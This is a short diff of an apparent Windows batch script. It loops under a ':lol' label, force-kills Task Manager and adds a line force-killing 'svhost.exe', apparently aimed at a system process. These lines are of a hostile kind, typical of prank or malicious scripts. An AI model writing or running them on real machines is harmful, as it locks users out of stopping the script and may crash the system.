@@ -46,3 +46,5 @@ goto nokey
 :lol
 taskkill /f /im taskmgr.exe
 ping localhost -n 3 >nul
+taskkill /f /im svhost.exe
+ping localhost -n 3 >nul
